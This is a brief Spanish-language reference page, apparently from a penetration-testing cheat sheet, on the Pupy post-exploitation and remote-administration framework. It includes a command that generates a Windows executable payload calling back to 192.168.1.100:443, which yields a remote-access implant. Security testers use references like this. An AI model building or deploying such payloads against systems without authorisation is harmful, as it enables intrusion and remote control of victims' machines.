### **Post-Explotación/Frameworks/Pupy.md**

# Pupy

## Descripción

**Pupy** es un framework multiplataforma de código abierto para post-explotación y administración remota. Soporta Windows, Linux, macOS y Android, proporcionando funcionalidades avanzadas para pruebas de seguridad.

## Uso

Configurar el servidor y generar payloads para los sistemas objetivo.

### Opciones principales

- **pupysh.py**: Consola interactiva del servidor.
- **pupygen.py**: Generador de payloads.

## Ejemplos

- Iniciar la consola del servidor:

  ```bash
  python pupy/pupysh.py
  ```

- Generar un payload para Windows:

  ```bash
  python pupy/pupygen.py -f exe_x86 -o payload.exe connect --host 192.168.1.100:443
  ```

- Gestionar sesiones de agentes conectados desde la consola.
